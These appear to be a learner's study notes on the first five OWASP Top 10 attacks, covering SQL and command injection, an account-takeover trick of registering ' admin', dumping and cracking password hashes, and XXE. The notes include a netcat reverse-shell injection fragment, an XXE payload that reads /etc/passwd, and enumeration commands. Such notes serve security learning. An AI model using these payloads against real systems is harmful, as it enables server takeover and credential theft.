##################################
#####OWASP###############
#############TOP 10 ATTACKS#####################
###############FIRST FIVE###################

1)Injections:
    ->SQL Injection == user controlled input is passed to SQL queries. 
                    An attacker can pass in SQL queries to manipulate the outcome of such queries.

    ->Cmd Injection == user input is passed to system commands. 
                    An attacker is able to execute arbitrary system commands on application servers.
    
    #The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands.
    ex: php native function to protect against special chars or SQL(DO::prepare() and PDOStatement::execute() helps to prevent SQL injection attacks)

2)OS Command Injection:
    ->It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.
        But the thing about command injection is it opens up many options for the attacker. 
        The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as.
        A simple ;nc -e /bin/bash is all that's needed and they own your server; some variants of netcat don't support the -e option. 
        You can use a list of these reverse shells as an alternative. 

        linux shell know os: lsb_release -a
                             Know the user: whoami
                             What is the userâ€™s shell set as ? cat /etc/passwd

3)Brken Auth:
    ->Force the Auth mechanism A lot of times what happens is that developers forgets to sanitize the input(username & password) 
        given by the user in the code of their application.

        ex: There is an existing user with the name "admin" and now we want to get access to their account so what we can do is try 
        to "re-register" that username but with slight modification. 
        We are going to enter " admin"(notice the space in the starting).
        
        ->It appears on the Burp Suite site as variable username=+admin

        Now when you enter that in the username field and enter other required information like email id or password and submit that data. 
        It will actually register a new user but that user will have the same right as normal admin. 
        That new user will also be able to see all the content presented under the user admin

4)Crack Hashed password from DB:
    if nmap scan == tcp 80 or 443:
        ->Enumerate the webapp via: ikto -h http://TargetIP:80 -no404
        ->Enumerate the directories via : dirbuster http://TargetIP/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

    ->If we were cusccessful to get infos from DB by using for example theses SQL requests:
            -1 in Kali Terminal #sqlite3 <database-name>
            -2 See the tables in the database by using this cmd: .tables
            -3 To see the table information use this cmd: PRAGMA table_info(customers); 
            -4 To extract infos: SELECT * FROM customers;
    
    ->After getting users credentials:
        It could be usefull to go to "crackstation" for performing HASH Decode

5) XML External Entity (XXE) attack:
    ->Abuses features of XML parsers/data. It often allows an attacker to interact with any backend.
        Or exterior, application itself can access and can allow the attacker to read the file on that system. 
        They can also cause Denial of Service (DoS) attack.
        Or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. 
        XXE may even enable port scanning and lead to remote code execution.

    ->There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
    a) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

    b) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

    ->Now we'll see some XXE payload and see how they are working:

    <!DOCTYPE replace [<!ENTITY name "feast"> ]>
    <userInfo>
    <firstName>falcon</firstName>
    <lastName>&name;</lastName>
    </userInfo>

    ->As we can see we are defining a ENTITY called name and assigning it a value feast. 
    ->Later we are using that ENTITY in our code.

    ->We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword:

    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
    <root>&read;</root>

    ->If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

5*)If we were able to get the SSH Private Key:

    ->We will try to crack SSH Private Key Passwords with John the Ripper
